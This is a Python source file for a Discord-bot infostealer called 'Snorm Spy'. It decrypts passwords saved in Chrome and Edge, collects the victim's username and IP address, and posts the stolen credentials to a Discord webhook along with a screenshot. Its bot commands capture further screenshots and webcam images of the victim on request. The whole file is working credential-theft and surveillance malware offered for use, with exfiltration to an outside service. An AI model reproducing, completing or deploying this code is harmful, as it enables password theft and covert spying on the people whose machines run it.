import os
import socket
import io
import json
import sqlite3
import shutil
import requests
from Crypto.Cipher import AES
import discord
from discord.ext import commands
import win32crypt
import base64
import logging
import asyncio
from PIL import ImageGrab
import cv2

logging.getLogger('discord').setLevel(logging.CRITICAL)

async def spam_injecting():
    while True:
        print("INJECTING.... injecting... INJECTING..")
        await asyncio.sleep(0.1)

TOKEN = 'sex'
WEBHOOK_URL = 'sex'

intents = discord.Intents.default()
intents.message_content = True  

bot = commands.Bot(command_prefix="!", intents=intents)

def get_encryption_key(browser="chrome"):
    try:
        if browser == "chrome":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        elif browser == "edge":
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        else:
            raise ValueError("Unsupported browser specified")

        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = decrypt_master_key(encrypted_key)

        if decrypted_key:
            return decrypted_key
        else:
            return None
    except Exception as e:
        return None

def decrypt_master_key(encrypted_key):
    try:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        return None

def decrypt_password_chrome(ciphertext, key):
    try:
        iv = ciphertext[3:15]  
        auth_tag = ciphertext[-16:]
        encrypted_data = ciphertext[15:-16]

        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(encrypted_data, auth_tag)

        return decrypted.decode("utf-8")
    except Exception as e:
        return None

def get_passwords_from_browser(browser="chrome"):
    key = get_encryption_key(browser)
    if not key:
        return {}

    if browser == "chrome":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser == "edge":
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    else:
        raise ValueError("Unsupported browser specified")

    if not os.path.exists(db_path):
        return {}

    file_name = "LoginData.db"
    shutil.copyfile(db_path, file_name)

    db = sqlite3.connect(file_name)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    result = {}
    for row in cursor.fetchall():
        action_url = row[0]
        username = row[1]
        password = decrypt_password_chrome(row[2], key)

        if username and password:
            result[action_url] = [username, password]

    cursor.close()
    db.close()
    os.remove(file_name)
    return result
    
def addinfo():
    sillyname = os.getlogin()
    hostname = socket.gethostname()
    ipad = socket.gethostbyname(hostname)
    
    return sillyname, ipad

    
def grabscreen():
    screenshot = ImageGrab.grab()
    return screenshot
    
def grabscreenbytes(screenshot):
    ssba = io.BytesIO()
    screenshot.save(ssba, format='PNG')
    return ssba.getvalue()

@bot.event
async def on_ready():
    try:
        sillyname, ipad = addinfo()
        
        chrome_data = get_passwords_from_browser("chrome")
        edge_data = get_passwords_from_browser("edge")
        
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)
        
        stolen_data = {**chrome_data, **edge_data}

        if stolen_data:
            print(f".....")
            
            image_url = "https://media.discordapp.net/attachments/1335780021817573499/1335825951249924207/313dddddd.png?ex=67a1945d&is=67a042dd&hm=199dca0c5f43187ccbe47d49dbe2c086b61157462878b7d09833fa0ee16aaf48&=&format=webp&quality=lossless"

            payload = {
                "embeds": [
                    {
                        "title": f"Data from {sillyname} ({ipad})",  
                        "description": f"**__Stolen Data__\n```json\n{stolen_data}```**",  
                        "url": "https://github.com/UnsillyHaxor",  
                        "color": 16711680,  
                        "footer": {
                            "text": "Grabbed by Snorm Spy | https://github.com/UnsillyHaxor | https://github.com/S-illy"  
                        },
                        "thumbnail": {
                            "url": image_url  
                        },
                        "image": {
                            "url": "attachment://screenshot.png"  # Aquí se indica que la imagen estará como un archivo adjunto
                        }
                    }
                ],
                "username": "Snorm Spy",  
                "avatar_url": image_url  
            }


            response = requests.post(WEBHOOK_URL, json=payload)

            if response.status_code == 204:
                print("Injecting..")
            else:
                print(f"Injection failed.")
        else:
            print("No passwords found to inject too...")

    except Exception as e:
        print(f"Error during on_ready: {e}")

@bot.command()
async def screenshot(ctx):
    try:
        screenshot = grabscreen()
        screenshot_bytes = grabscreenbytes(screenshot)

        await ctx.send(
            content="Here is the screenshot!",
            files=[discord.File(io.BytesIO(screenshot_bytes), filename="screenshot.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def webcam(ctx):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()

        if not ret:
            await ctx.send("Can't access webcam")
            return

        _, img_encoded = cv2.imencode('.png', frame)
        img_bytes = img_encoded.tobytes()

        await ctx.send(
            content="See da pretty face",
            files=[discord.File(io.BytesIO(img_bytes), filename="webcam.png")]
        )

    except Exception as e:
        await ctx.send(f"Error: {e}")

bot.run(TOKEN)
